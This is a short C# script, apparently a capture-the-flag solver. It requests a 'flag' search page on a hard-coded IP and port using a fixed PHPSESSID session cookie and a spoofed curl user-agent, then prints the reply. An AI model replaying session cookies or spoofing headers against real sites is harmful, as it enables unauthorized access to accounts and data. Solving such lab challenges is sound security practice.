
using System.Net;
using System.Net.Http.Headers;

internal static class Solver
{
     public static async Task Main()
     {
          CookieContainer container = new CookieContainer();
          using HttpMessageHandler handler = new HttpClientHandler()
          {
               CookieContainer = container
          };
          using HttpClient client = new HttpClient(handler);

          Uri baseAddress = new Uri("http://83.136.253.211:53449/");
          Cookie sessionId = new Cookie("PHPSESSID", "78kbhktg7pd2di8fql7hgnv7ng");
          sessionId.Domain = baseAddress.ToString();
          container.Add(sessionId);
          HttpRequestMessage message = new(HttpMethod.Get,
               new Uri("http://83.136.253.211:53449/search.php?search=flag"));

          message.Headers.UserAgent.Add(ProductInfoHeaderValue.Parse("curl/8.8.0"));
          HttpResponseMessage response = await client.SendAsync(message);

          Console.WriteLine(response.StatusCode);
          Console.WriteLine(await response.Content.ReadAsStringAsync());
     }
}